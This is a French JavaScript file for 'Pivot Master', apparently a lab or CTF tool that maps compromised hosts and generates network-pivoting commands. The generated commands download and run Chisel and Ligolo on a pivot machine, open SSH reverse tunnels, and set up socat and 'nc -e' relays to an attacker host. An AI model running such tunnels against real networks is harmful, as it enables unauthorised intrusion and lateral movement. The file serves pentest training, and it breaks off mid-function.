/**
 * Pivot Master - Générateur de commandes de pivot
 * Interface simple pour saisir les informations et générer des commandes
 */

class NetworkVisualizer {
    constructor(pivotMaster) {
        this.pivotMaster = pivotMaster;
        this.network = null;
        this.nodes = null;
        this.edges = null;
        this.container = null;
        this.physicsEnabled = true;
    }

    async init() {
        this.container = document.getElementById('networkCanvas');
        if (!this.container) {
            console.warn('Conteneur réseau non trouvé');
            return;
        }

        this.setupNetworkOptions();
        this.setupEventListeners();
        this.createNetwork();
    }

    setupEventListeners() {
        // Options réseau
        document.getElementById('showLabels')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('showEdgeLabels')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('hierarchicalLayout')?.addEventListener('change', () => this.updateNetwork());
        document.getElementById('smoothEdges')?.addEventListener('change', () => this.updateNetwork());
    }

    setupNetworkOptions() {
        this.nodes = new vis.DataSet([]);
        this.edges = new vis.DataSet([]);
    }

    createNetwork() {
        const data = {
            nodes: this.nodes,
            edges: this.edges
        };

        const options = {
            nodes: {
                shape: 'dot',
                size: 25,
                font: {
                    size: 14,
                    color: '#000000'
                },
                borderWidth: 3,
                shadow: true
            },
            edges: {
                width: 3,
                color: { inherit: 'from' },
                smooth: {
                    type: 'continuous'
                },
                arrows: {
                    to: { enabled: true, scaleFactor: 1.2 }
                },
                shadow: true
            },
            physics: {
                enabled: this.physicsEnabled,
                stabilization: { iterations: 100 }
            },
            interaction: {
                hover: true,
                selectConnectedEdges: false
            }
        };

        this.network = new vis.Network(this.container, data, options);
        
        // Événements réseau
        this.network.on('click', (params) => {
            if (params.nodes.length > 0) {
                this.showNodeInfo(params.nodes[0]);
            }
        });

        this.network.on('hoverNode', () => {
            this.container.style.cursor = 'pointer';
        });

        this.network.on('blurNode', () => {
            this.container.style.cursor = 'default';
        });
    }

    updateNetworkFromConfig() {
        if (!this.network) return;

        const config = this.pivotMaster.config;
        this.nodes.clear();
        this.edges.clear();

        // Nœud attaquant
        this.nodes.add({
            id: 'attacker',
            label: `🔥 Attaquant\n${config.attacker.ip}`,
            color: {
                background: '#dc3545',
                border: '#c82333'
            },
            group: 'attacker',
            x: -200,
            y: 0,
            fixed: { x: true, y: false }
        });

        // Target 1 (point d'entrée)
        if (config.target1.ip) {
            const network1 = this.getNetworkSegment(config.target1.ip);
            this.nodes.add({
                id: 'target1',
                label: `${this.getOSIcon(config.target1.os)} Target 1\n${config.target1.ip}\n(${config.target1.user || 'user'})`,
                color: this.getNodeColor(config.target1.os),
                group: network1,
                x: 0,
                y: -100
            });

            // Connexion attaquant -> target1
            this.edges.add({
                id: 'att-t1',
                from: 'attacker',
                to: 'target1',
                label: 'Initial Access',
                color: { color: '#28a745' },
                width: 4
            });
        }

        // Target 2 (destination)
        if (config.target2.ip) {
            const network2 = this.getNetworkSegment(config.target2.ip);
            this.nodes.add({
                id: 'target2',
                label: `${this.getOSIcon(config.target2.os)} Target 2\n${config.target2.ip}\n:${config.target2.port}`,
                color: this.getNodeColor(config.target2.os),
                group: network2,
                x: 200,
                y: 0
            });

            // Connexion target1 -> target2 (pivot)
            if (config.target1.ip) {
                this.edges.add({
                    id: 't1-t2',
                    from: 'target1',
                    to: 'target2',
                    label: 'Pivot',
                    color: { color: '#ffc107' },
                    width: 4,
                    dashes: [10, 5]
                });
            }
        }

        // Target 3 (double pivot)
        if (config.doublePivot && config.target3.ip) {
            const network3 = this.getNetworkSegment(config.target3.ip);
            this.nodes.add({
                id: 'target3',
                label: `🎯 Target 3\n${config.target3.ip}\n:${config.target3.port}`,
                color: {
                    background: '#6f42c1',
                    border: '#5a31a5'
                },
                group: network3,
                x: 400,
                y: 100
            });

            // Connexion target2 -> target3 (double pivot)
            this.edges.add({
                id: 't2-t3',
                from: 'target2',
                to: 'target3',
                label: 'Double Pivot',
                color: { color: '#e83e8c' },
                width: 4,
                dashes: [15, 10]
            });
        }

        // Grouper par réseau si différent
        this.addNetworkGroups();
        
        // Générer l'explication intelligente
        this.generateExplanation();
        
        // Ajuster la vue
        setTimeout(() => {
            this.network.fit();
        }, 500);
    }

    generateExplanation() {
        const config = this.pivotMaster.config;
        const selectedTechniques = Array.from(this.pivotMaster.selectedTechniques);
        const explanationContent = document.getElementById('explanationContent');
        const explanationStatus = document.getElementById('explanationStatus');
        
        if (!explanationContent) return;

        // Vérifier si on a assez d'infos
        if (!config.target1.ip || !config.target2.ip) {
            explanationContent.innerHTML = `
                <div class="explanation-placeholder">
                    <i>📝</i>
                    <p>Configurez au minimum Target 1 et Target 2 pour voir l'explication du pivot...</p>
                </div>
            `;
            explanationStatus.innerHTML = `
                <span class="status-indicator">⚠️</span>
                <span>Configuration incomplète</span>
            `;
            return;
        }

        // Analyser la configuration
        const network1 = this.getNetworkSegment(config.target1.ip);
        const network2 = this.getNetworkSegment(config.target2.ip);
        const network3 = config.doublePivot ? this.getNetworkSegment(config.target3.ip) : null;
        
        const isDifferentNetwork = network1 !== network2;
        const isTripleNetwork = network3 && network3 !== network2 && network3 !== network1;

        // Générer le résumé réseau
        let networkSummary = `
            <div class="network-summary">
                <h5>📊 Analyse de la Topologie Réseau</h5>
                <p>
                    ${isDifferentNetwork ? 
                        `🔀 <strong>Pivot multi-réseau détecté :</strong> ${network1} → ${network2}${network3 ? ` → ${network3}` : ''}` :
                        `🏠 <strong>Pivot intra-réseau :</strong> Toutes les machines dans ${network1}`
                    }
                    ${selectedTechniques.length > 0 ? 
                        ` | <strong>Techniques sélectionnées :</strong> ${selectedTechniques.length}` : 
                        ' | ⚠️ Aucune technique sélectionnée'
                    }
                </p>
            </div>
        `;

        // Générer les étapes du pivot
        let pivotFlow = '<div class="pivot-flow">';
        let stepNumber = 1;

        // Étape 1: Accès initial
        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber++}</div>
                    <div class="step-title">🎯 Accès Initial - Compromission de Target 1</div>
                </div>
                <div class="step-description">
                    Vous avez obtenu un accès sur <code>${config.target1.ip}</code> (${config.target1.user || 'utilisateur'}) 
                    via votre machine attaquante <code>${config.attacker.ip}</code>.
                    ${config.target1.services ? ` Services découverts : ${config.target1.services}` : ''}
                </div>
            </div>
        `;

        // Étape 2: Configuration du pivot
        const pivotDescription = isDifferentNetwork ? 
            `Cette machine sert de <strong>pont</strong> pour atteindre le réseau ${network2} depuis ${network1}.` :
            `Cette machine sert de <strong>relais</strong> pour atteindre d'autres services dans le même réseau.`;

        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber++}</div>
                    <div class="step-title">🔀 Configuration du Pivot vers Target 2</div>
                </div>
                <div class="step-description">
                    Target 1 va servir de point de pivot pour accéder à <code>${config.target2.ip}:${config.target2.port}</code>. 
                    ${pivotDescription}
                </div>
                ${selectedTechniques.length > 0 ? `
                    <div class="step-techniques">
                        ${selectedTechniques.map(tech => `<span class="technique-badge ${tech}">${this.getTechniqueName(tech)}</span>`).join('')}
                    </div>
                ` : ''}
            </div>
        `;

        // Étape 3: Double pivot si configuré
        if (config.doublePivot && config.target3.ip) {
            const doublePivotDescription = isTripleNetwork ? 
                `Target 2 servira de second relais pour atteindre le réseau ${network3}.` :
                `Target 2 servira de second relais dans le réseau ${network2}.`;

            pivotFlow += `
                <div class="flow-step">
                    <div class="step-header">
                        <div class="step-number">${stepNumber++}</div>
                        <div class="step-title">🔀🔀 Double Pivot vers Target 3</div>
                    </div>
                    <div class="step-description">
                        Une fois Target 2 accessible, vous configurerez un <strong>double pivot</strong> pour atteindre 
                        <code>${config.target3.ip}:${config.target3.port}</code>. ${doublePivotDescription}
                    </div>
                    ${selectedTechniques.length > 0 ? `
                        <div class="step-techniques">
                            ${selectedTechniques.map(tech => `<span class="technique-badge ${tech}">${this.getTechniqueName(tech)} (Chain)</span>`).join('')}
                        </div>
                    ` : ''}
                </div>
            `;
        }

        // Étape finale: Exécution
        pivotFlow += `
            <div class="flow-step">
                <div class="step-header">
                    <div class="step-number">${stepNumber}</div>
                    <div class="step-title">⚡ Exécution des Commandes</div>
                </div>
                <div class="step-description">
                    Les commandes générées configureront automatiquement ${selectedTechniques.length > 0 ? 'les techniques sélectionnées' : 'les techniques par défaut'} 
                    pour établir ${config.doublePivot ? 'la chaîne de double pivot' : 'le tunnel de pivot'}. 
                    Vous pourrez ensuite accéder aux services cibles comme s'ils étaient locaux.
                </div>
            </div>
        `;

        pivotFlow += '</div>';

        // Assembler le contenu final
        explanationContent.innerHTML = networkSummary + pivotFlow;

        // Mettre à jour le status
        const techniqueCount = selectedTechniques.length;
        const pivotType = config.doublePivot ? 'Double Pivot' : 'Simple Pivot';
        explanationStatus.innerHTML = `
            <span class="status-indicator">✅</span>
            <span>${pivotType} | ${techniqueCount} technique${techniqueCount > 1 ? 's' : ''}</span>
        `;
    }

    getTechniqueName(tech) {
        const names = {
            'ssh': 'SSH',
            'chisel': 'Chisel',
            'ligolo': 'Ligolo-ng',
            'socat': 'Socat',
            'netcat': 'Netcat',
            'metasploit': 'Metasploit'
        };
        return names[tech] || tech;
    }

    getNetworkSegment(ip) {
        if (!ip) return 'unknown';
        const parts = ip.split('.');
        if (parts.length >= 3) {
            return `${parts[0]}.${parts[1]}.${parts[2]}.x`;
        }
        return 'unknown';
    }

    getOSIcon(os) {
        switch(os) {
            case 'linux': return '🐧';
            case 'windows': return '🪟';
            default: return '💻';
        }
    }

    getNodeColor(os) {
        switch(os) {
            case 'linux':
                return {
                    background: '#17a2b8',
                    border: '#138496'
                };
            case 'windows':
                return {
                    background: '#007bff',
                    border: '#0056b3'
                };
            default:
                return {
                    background: '#6c757d',
                    border: '#545b62'
                };
        }
    }

    addNetworkGroups() {
        // Ajouter des nœuds de réseau pour la segmentation
        const networks = new Set();
        this.nodes.forEach(node => {
            if (node.group && node.group !== 'attacker') {
                networks.add(node.group);
            }
        });

        let yOffset = 200;
        networks.forEach(network => {
            this.nodes.add({
                id: `net-${network}`,
                label: `📡 ${network}`,
                color: {
                    background: '#f8f9fa',
                    border: '#dee2e6'
                },
                shape: 'box',
                size: 15,
                font: { size: 10 },
                x: 0,
                y: yOffset,
                physics: false
            });
            yOffset += 50;
        });
    }

    showNodeInfo(nodeId) {
        const node = this.nodes.get(nodeId);
        const config = this.pivotMaster.config;
        const infoContent = document.getElementById('networkInfoContent');
        
        if (!infoContent || !node) return;

        let info = '';
        
        switch(nodeId) {
            case 'attacker':
                info = `
                    <div class="node-info">
                        <h5>🔥 Machine Attaquante</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.attacker.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Port d'écoute</div>
                            <div class="node-info-value">${config.attacker.port}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Rôle</div>
                            <div class="node-info-value">Point de départ de l'attaque</div>
                        </div>
                    </div>
                `;
                break;
            case 'target1':
                info = `
                    <div class="node-info">
                        <h5>${this.getOSIcon(config.target1.os)} Target 1 - Point d'entrée</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.target1.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Utilisateur</div>
                            <div class="node-info-value">${config.target1.user || 'N/A'}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Système d'exploitation</div>
                            <div class="node-info-value">${config.target1.os}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Services ouverts</div>
                            <div class="node-info-value">${config.target1.services || 'N/A'}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Réseau</div>
                            <div class="node-info-value">${this.getNetworkSegment(config.target1.ip)}</div>
                        </div>
                    </div>
                `;
                break;
            case 'target2':
                info = `
                    <div class="node-info">
                        <h5>${this.getOSIcon(config.target2.os)} Target 2 - Destination</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.target2.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Port cible</div>
                            <div class="node-info-value">${config.target2.port}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Système d'exploitation</div>
                            <div class="node-info-value">${config.target2.os}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Réseau</div>
                            <div class="node-info-value">${this.getNetworkSegment(config.target2.ip)}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Accès via</div>
                            <div class="node-info-value">Pivot depuis Target 1</div>
                        </div>
                    </div>
                `;
                break;
            case 'target3':
                info = `
                    <div class="node-info">
                        <h5>🎯 Target 3 - Double Pivot</h5>
                        <div class="node-info-item">
                            <div class="node-info-label">Adresse IP</div>
                            <div class="node-info-value">${config.target3.ip}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Port cible</div>
                            <div class="node-info-value">${config.target3.port}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Réseau</div>
                            <div class="node-info-value">${this.getNetworkSegment(config.target3.ip)}</div>
                        </div>
                        <div class="node-info-item">
                            <div class="node-info-label">Accès via</div>
                            <div class="node-info-value">Double pivot depuis Target 2</div>
                        </div>
                    </div>
                `;
                break;
            default:
                if (nodeId.startsWith('net-')) {
                    const network = nodeId.replace('net-', '');
                    info = `
                        <div class="node-info">
                            <h5>📡 Segment Réseau</h5>
                            <div class="node-info-item">
                                <div class="node-info-label">Réseau</div>
                                <div class="node-info-value">${network}</div>
                            </div>
                            <div class="node-info-item">
                                <div class="node-info-label">Type</div>
                                <div class="node-info-value">Segment isolé</div>
                            </div>
                        </div>
                    `;
                }
                break;
        }

        infoContent.innerHTML = info;
    }

    updateNetwork() {
        if (!this.network) return;

        const showLabels = document.getElementById('showLabels')?.checked ?? true;
        const showEdgeLabels = document.getElementById('showEdgeLabels')?.checked ?? false;
        const hierarchical = document.getElementById('hierarchicalLayout')?.checked ?? false;
        const smoothEdges = document.getElementById('smoothEdges')?.checked ?? true;

        const options = {
            nodes: {
                font: { color: showLabels ? '#000000' : 'transparent' }
            },
            edges: {
                label: showEdgeLabels ? undefined : '',
                smooth: smoothEdges
            },
            layout: hierarchical ? {
                hierarchical: {
                    direction: 'LR',
                    sortMethod: 'directed'
                }
            } : {}
        };

        this.network.setOptions(options);
    }

    fitNetwork() {
        if (this.network) {
            this.network.fit();
        }
    }

    resetNetwork() {
        if (this.network) {
            this.network.fit();
            this.network.redraw();
        }
    }

    togglePhysics() {
        this.physicsEnabled = !this.physicsEnabled;
        if (this.network) {
            this.network.setOptions({ physics: { enabled: this.physicsEnabled } });
        }
    }

    exportImage() {
        if (this.network) {
            const canvas = this.network.canvas.frame.canvas;
            const link = document.createElement('a');
            link.download = 'pivot-topology.png';
            link.href = canvas.toDataURL();
            link.click();
        }
    }
}

class PivotMaster {
    constructor() {
        this.config = {
            attacker: { ip: '', port: '' },
            target1: { ip: '', user: '', os: '', services: '' },
            target2: { ip: '', port: '', os: '' },
            target3: { ip: '', port: '' },
            doublePivot: false
        };
        this.selectedTechniques = new Set(['ssh', 'chisel']);
        this.generatedCommands = {};
        this.activeTab = 'ssh';
        this.networkVisualizer = null;
    }

    /**
     * Initialisation principale
     */
    async init() {
        console.log('🔀 Initialisation de Pivot Master...');
        
        this.setupEventListeners();
        this.loadDefaultValues();
        
        // Initialiser la visualisation réseau
        this.networkVisualizer = new NetworkVisualizer(this);
        await this.networkVisualizer.init();
        
        console.log('✅ Pivot Master initialisé avec succès');
    }

    /**
     * Configuration des écouteurs d'événements
     */
    setupEventListeners() {
        // Écouteurs pour les champs de formulaire
        const formInputs = [
            'attackerIp', 'attackerPort',
            'target1Ip', 'target1Port', 'target1User', 'target1Password',
            'target2Ip', 'target2Port', 'target2User', 'target2Password',
            'doublePivot'
        ];

        formInputs.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('change', () => {
                    try {
                        this.saveConfig();
                    } catch (error) {
                        console.error('Erreur lors de la sauvegarde de la configuration:', error);
                    }
                });
            }
        });

        // Écouteurs pour les outils
        const toolCheckboxes = document.querySelectorAll('input[name="tools"]');
        toolCheckboxes.forEach(checkbox => {
            checkbox.addEventListener('change', () => {
                try {
                    this.saveConfig();
                } catch (error) {
                    console.error('Erreur lors de la sauvegarde de la configuration:', error);
                }
            });
        });

        // Écouteur pour le double pivot
        const doublePivotCheckbox = document.getElementById('doublePivot');
        if (doublePivotCheckbox) {
            doublePivotCheckbox.addEventListener('change', () => {
                try {
                    this.toggleDoublePivot();
                this.saveConfig();
                } catch (error) {
                    console.error('Erreur lors de la gestion du double pivot:', error);
                }
        });
        }
    }

    /**
     * Valeurs par défaut
     */
    loadDefaultValues() {
        // Charger depuis localStorage ou utiliser les valeurs par défaut
        const saved = localStorage.getItem('pivotMasterConfig');
        if (saved) {
            try {
                this.config = JSON.parse(saved);
                this.restoreFormValues();
            } catch (e) {
                console.warn('Erreur lors du chargement de la config:', e);
            }
        }
        
        // Mise à jour initiale de la visualisation
        setTimeout(() => this.updateNetworkVisualization(), 500);
    }

    /**
     * Restaurer les valeurs du formulaire
     */
    restoreFormValues() {
        document.getElementById('attackerIP').value = this.config.attacker.ip || '10.10.14.15';
        document.getElementById('attackerPort').value = this.config.attacker.port || '4444';
        
        document.getElementById('target1IP').value = this.config.target1.ip || '';
        document.getElementById('target1User').value = this.config.target1.user || '';
        document.getElementById('target1OS').value = this.config.target1.os || 'linux';
        document.getElementById('target1Services').value = this.config.target1.services || '';
        
        document.getElementById('target2IP').value = this.config.target2.ip || '';
        document.getElementById('target2Port').value = this.config.target2.port || '22';
        document.getElementById('target2OS').value = this.config.target2.os || 'linux';
        
        document.getElementById('doublePivot').checked = this.config.doublePivot || false;
        this.toggleDoublePivot();
        
        if (this.config.doublePivot) {
            document.getElementById('target3IP').value = this.config.target3.ip || '';
            document.getElementById('target3Port').value = this.config.target3.port || '3389';
        }
    }

    /**
     * Sauvegarder la configuration
     */
    saveConfig() {
        const config = {
            attacker: {
                ip: document.getElementById('attackerIp')?.value || '',
                port: document.getElementById('attackerPort')?.value || ''
            },
            target1: {
                ip: document.getElementById('target1Ip')?.value || '',
                port: document.getElementById('target1Port')?.value || '',
                user: document.getElementById('target1User')?.value || '',
                password: document.getElementById('target1Password')?.value || ''
            },
            target2: {
                ip: document.getElementById('target2Ip')?.value || '',
                port: document.getElementById('target2Port')?.value || '',
                user: document.getElementById('target2User')?.value || '',
                password: document.getElementById('target2Password')?.value || ''
            },
            doublePivot: document.getElementById('doublePivot')?.checked || false,
            selectedTools: Array.from(document.querySelectorAll('input[name="tools"]:checked')).map(input => input.value)
        };

        try {
            localStorage.setItem('pivotConfig', JSON.stringify(config));
        } catch (error) {
            console.error('Erreur lors de la sauvegarde de la configuration:', error);
        }
    }

    /**
     * Toggle double pivot
     */
    toggleDoublePivot() {
        const doublePivotCheckbox = document.getElementById('doublePivot');
        const target2Group = document.getElementById('target2Group');
        const toolCards = document.querySelectorAll('.tool-card');

        if (!doublePivotCheckbox || !target2Group) return;

        if (doublePivotCheckbox.checked) {
            target2Group.style.display = 'block';
            // Désactiver les outils qui ne supportent pas le double pivot
            toolCards.forEach(card => {
                const supportsDoublePivot = card.dataset.supportsDoublePivot === 'true';
                const checkbox = card.querySelector('input[type="checkbox"]');
                if (!supportsDoublePivot && checkbox.checked) {
                    checkbox.checked = false;
                    this.showNotification('Cet outil ne supporte pas le double pivot', 'warning');
                }
                card.style.opacity = supportsDoublePivot ? '1' : '0.5';
                card.style.pointerEvents = supportsDoublePivot ? 'auto' : 'none';
            });
        } else {
            target2Group.style.display = 'none';
            // Réactiver tous les outils
            toolCards.forEach(card => {
                card.style.opacity = '1';
                card.style.pointerEvents = 'auto';
            });
        }

        // Mettre à jour la visualisation réseau
        this.updateNetworkVisualization();
    }

    /**
     * Toggle technique selection
     */
    toggleTechnique(technique, enabled) {
        const card = document.querySelector(`[data-technique="${technique}"]`);
        
        if (enabled) {
            this.selectedTechniques.add(technique);
            card?.classList.add('selected');
        } else {
            this.selectedTechniques.delete(technique);
            card?.classList.remove('selected');
        }
    }

    /**
     * Validation des données
     */
    validateInput() {
        const errors = [];

        if (!this.config.attacker.ip) {
            errors.push('IP attaquant requis');
        }

        if (!this.config.target1.ip) {
            errors.push('IP Target 1 requis');
        }

        if (!this.config.target2.ip) {
            errors.push('IP Target 2 requis');
        }

        if (this.config.doublePivot && !this.config.target3.ip) {
            errors.push('IP Target 3 requis pour double pivot');
        }

        if (this.selectedTechniques.size === 0) {
            errors.push('Au moins une technique doit être sélectionnée');
        }

        return errors;
    }

    /**
     * Génération des commandes principales
     */
    generateCommands() {
        try {
            // Récupérer les outils sélectionnés
            const selectedTools = Array.from(document.querySelectorAll('input[name="tools"]:checked')).map(input => input.value);
            
            if (selectedTools.length === 0) {
                this.showNotification('Veuillez sélectionner au moins un outil', 'warning');
            return;
        }

            // Récupérer les valeurs de configuration
            const config = {
                attacker: {
                    ip: document.getElementById('attackerIp')?.value || '',
                    port: document.getElementById('attackerPort')?.value || ''
                },
                target1: {
                    ip: document.getElementById('target1Ip')?.value || '',
                    port: document.getElementById('target1Port')?.value || '',
                    user: document.getElementById('target1User')?.value || '',
                    password: document.getElementById('target1Password')?.value || ''
                },
                target2: {
                    ip: document.getElementById('target2Ip')?.value || '',
                    port: document.getElementById('target2Port')?.value || '',
                    user: document.getElementById('target2User')?.value || '',
                    password: document.getElementById('target2Password')?.value || ''
                },
                doublePivot: document.getElementById('doublePivot')?.checked || false
            };

            // Générer les commandes pour chaque outil sélectionné
            let allCommands = {};
            selectedTools.forEach(tool => {
                switch(tool) {
                    case 'ssh':
                        allCommands.ssh = {
                            title: 'SSH Tunneling',
                            description: config.doublePivot ? 
                                'Établissement d\'un tunnel SSH pour accéder au réseau cible via un double pivot' :
                                'Établissement d\'un tunnel SSH pour accéder au réseau cible',
                            sections: [
                                {
                                    title: '1. Configuration du Tunnel SSH',
                                    description: config.doublePivot ?
                                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible (Target 2)' :
                                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible',
                                    command: `# Sur Target 1 (Machine Pivot)
# Cette commande crée un tunnel SOCKS sur le port 1080 de la machine attaquante
# -R : Crée un tunnel distant (remote)
# 1080 : Port sur la machine attaquante
# ${config.target2.ip}:${config.target2.port} : Machine et port cible
# -N : Ne pas exécuter de commande distante (tunnel uniquement)
ssh -R 1080:${config.target2.ip}:${config.target2.port} ${config.attacker.ip} -N`,
                                    comment: 'Le tunnel SSH crée un proxy SOCKS sur le port 1080 de votre machine attaquante'
                                }
                            ]
                        };
                        break;
                    case 'chisel':
                        allCommands.chisel = {
                            title: 'Chisel Tunneling',
                            description: config.doublePivot ?
                                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible via un double pivot' :
                                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible',
                            sections: [
                                {
                                    title: '1. Démarrage du Serveur Chisel',
                                    description: 'Sur votre machine attaquante, démarrez le serveur Chisel',
                                    command: `# Sur la machine attaquante
# Télécharger Chisel si ce n'est pas déjà fait
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64

# Démarrer le serveur Chisel
# -p : Port d'écoute
# --reverse : Mode reverse shell
./chisel_1.7.7_linux_amd64 server -p ${config.attacker.port} --reverse`,
                                    comment: 'Le serveur Chisel écoute sur le port spécifié et attend les connexions des clients'
                                },
                                {
                                    title: '2. Configuration du Client Chisel',
                                    description: 'Sur la machine pivot, configurez et démarrez le client Chisel',
                                    command: `# Sur Target 1 (Machine Pivot)
# Télécharger Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64

# Démarrer le client Chisel
# R:1080 : Crée un tunnel SOCKS sur le port 1080
# ${config.target2.ip}:${config.target2.port} : Machine et port cible
./chisel_1.7.7_linux_amd64 client ${config.attacker.ip}:${config.attacker.port} R:1080:${config.target2.ip}:${config.target2.port}`,
                                    comment: 'Le client Chisel crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
                                }
                            ]
                        };
                        break;
                    case 'ligolo':
                        allCommands.ligolo = {
                            title: 'Ligolo Tunneling',
                            description: config.doublePivot ?
                                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible via un double pivot' :
                                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible',
                            sections: [
                                {
                                    title: '1. Configuration du Serveur Ligolo',
                                    description: 'Sur votre machine attaquante, configurez et démarrez le serveur Ligolo',
                                    command: `# Sur la machine attaquante
# Télécharger Ligolo si ce n'est pas déjà fait
wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
chmod +x ligolo-v0.4.4-linux-amd64

# Démarrer le serveur Ligolo
# -selfcert : Génère un certificat auto-signé
# -laddr : Adresse et port d'écoute
./ligolo-v0.4.4-linux-amd64 -selfcert -laddr 0.0.0.0:${config.attacker.port}`,
                                    comment: 'Le serveur Ligolo écoute sur le port spécifié et attend les connexions des clients'
                                },
                                {
                                    title: '2. Configuration du Client Ligolo',
                                    description: 'Sur la machine pivot, configurez et démarrez le client Ligolo',
                                    command: `# Sur Target 1 (Machine Pivot)
# Télécharger Ligolo
wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
chmod +x ligolo-v0.4.4-linux-amd64

# Démarrer le client Ligolo
# -connect : Se connecte au serveur
# -socks : Crée un tunnel SOCKS sur le port spécifié
./ligolo-v0.4.4-linux-amd64 -connect ${config.attacker.ip}:${config.attacker.port} -socks 1080`,
                                    comment: 'Le client Ligolo crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
                                }
                            ]
                        };
                        break;
                    case 'socat':
                        allCommands.socat = {
                            title: 'Socat Tunneling',
                            description: config.doublePivot ?
                                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible via un double pivot' :
                                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible',
                            sections: [
                                {
                                    title: '1. Installation de Socat',
                                    description: 'Sur la machine pivot, installez Socat si ce n\'est pas déjà fait',
                                    command: `# Sur Target 1 (Machine Pivot)
# Installation de Socat
apt-get update && apt-get install -y socat  # Pour Debian/Ubuntu
# ou
yum install -y socat  # Pour RHEL/CentOS`,
                                    comment: 'Socat doit être installé sur la machine pivot'
                                },
                                {
                                    title: '2. Création du Tunnel',
                                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
                                    command: `# Sur Target 1 (Machine Pivot)
# Création du tunnel
# TCP-LISTEN:1080 : Écoute sur le port 1080
# fork : Permet plusieurs connexions simultanées
# TCP:${config.target2.ip}:${config.target2.port} : Machine et port cible
socat TCP-LISTEN:1080,fork TCP:${config.target2.ip}:${config.target2.port}`,
                                    comment: 'Le tunnel Socat est maintenant actif sur le port 1080'
                                }
                            ]
                        };
                        break;
                    case 'netcat':
                        allCommands.netcat = {
                            title: 'Netcat Tunneling',
                            description: config.doublePivot ?
                                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible via un double pivot' :
                                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible',
                            sections: [
                                {
                                    title: '1. Vérification de Netcat',
                                    description: 'Sur la machine pivot, vérifiez que Netcat est installé',
                                    command: `# Sur Target 1 (Machine Pivot)
# Vérifier la version de Netcat
nc -h`,
                                    comment: 'Netcat doit être installé sur la machine pivot'
                                },
                                {
                                    title: '2. Création du Tunnel',
                                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
                                    command: `# Sur Target 1 (Machine Pivot)
# Création du tunnel
# -l : Mode écoute
# -p : Port d'écoute
# -k : Garde la connexion ouverte
nc -l -p 1080 -k -e nc ${config.target2.ip} ${config.target2.port}`,
                                    comment: 'Le tunnel Netcat est maintenant actif sur le port 1080'
                                }
                            ]
                        };
                        break;
                }
            });

            // Afficher les résultats
            this.displayResults(allCommands);

        } catch (error) {
            console.error('Erreur lors de la génération des commandes:', error);
            this.showNotification('Erreur lors de la génération des commandes', 'error');
        }
    }

    displayResults(allCommands) {
        const resultsSection = document.getElementById('resultsSection');
        const tabsNav = document.getElementById('commandsTabs');
        const tabsContent = document.getElementById('commandsContent');

        if (!resultsSection || !tabsNav || !tabsContent) {
            console.error('Éléments manquants pour l\'affichage des résultats');
            return;
        }

        // Afficher la section des résultats
        resultsSection.style.display = 'block';

        // Vider les conteneurs
        tabsNav.innerHTML = '';
        tabsContent.innerHTML = '';

        // Vérifier s'il y a des commandes à afficher
        if (Object.keys(allCommands).length === 0) {
            tabsContent.innerHTML = `
                <div class="alert alert-info">
                    <i class="fas fa-info-circle"></i> Aucune commande générée. Veuillez sélectionner des outils et configurer les paramètres.
                </div>
            `;
            return;
        }

        // Créer les onglets et le contenu pour chaque outil
        Object.entries(allCommands).forEach(([tool, data], index) => {
            // Créer l'onglet
            const tab = document.createElement('button');
            tab.className = `tab-button ${index === 0 ? 'active' : ''}`;
            tab.innerHTML = `
                <i class="${this.getToolIcon(tool)}"></i>
                ${data.title}
            `;
            tab.onclick = () => this.switchTab(tool);
            tabsNav.appendChild(tab);

            // Créer le contenu
            const content = document.createElement('div');
            content.className = `tab-pane ${index === 0 ? 'active' : ''}`;
            content.id = `${tool}Content`;

            // Ajouter le titre et la description
            content.innerHTML = `
                <div class="tool-header">
                    <h4>${data.title}</h4>
                    <p>${data.description}</p>
                </div>
            `;

